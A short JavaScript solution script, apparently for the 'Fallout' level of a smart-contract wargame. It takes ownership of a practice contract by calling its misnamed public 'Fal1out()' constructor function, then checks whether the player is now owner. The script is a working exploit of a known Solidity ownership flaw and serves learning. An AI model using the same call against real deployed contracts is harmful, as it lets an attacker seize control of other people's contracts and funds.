const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    const victim = loader.web3.fromArtifact('Fallout', instance)
    console.log('Call Fal1out() "constructor" method...')
    await victim.methods.Fal1out().send()
    const owner = await victim.methods.owner().call()
    if (owner == web3.eth.defaultAccount) {
      console.log(
        'Player is now owner!',
        'You can submit the instance in the browser'
      )
    } else {
      console.log(`Owner is ${owner}`)
    }
  } catch (err) {
    console.log(err.message)
  }
})()
